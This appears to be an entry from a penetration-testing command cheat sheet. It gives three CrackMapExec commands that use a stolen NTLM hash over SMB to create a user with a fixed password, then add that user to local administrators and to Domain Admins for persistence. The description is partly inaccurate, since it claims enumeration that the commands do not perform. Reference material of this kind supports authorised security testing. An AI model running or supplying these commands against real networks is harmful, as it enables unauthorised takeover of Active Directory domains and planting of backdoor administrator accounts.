---
title: |
  Create a new domain admin account with CME
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. Create a new domain admin account.

  Command Reference:

  	1. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x "net user Onvio Welkom01! /add"

  	2. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x "net localgroup administrators Onvio /add"

  	3. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x 'net group "Domain Admins" Onvio /add'

command: |
  See commands.
items:
  - Username
  - Password
  - Hash
services:
  - SMB
OS:
  - Linux
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
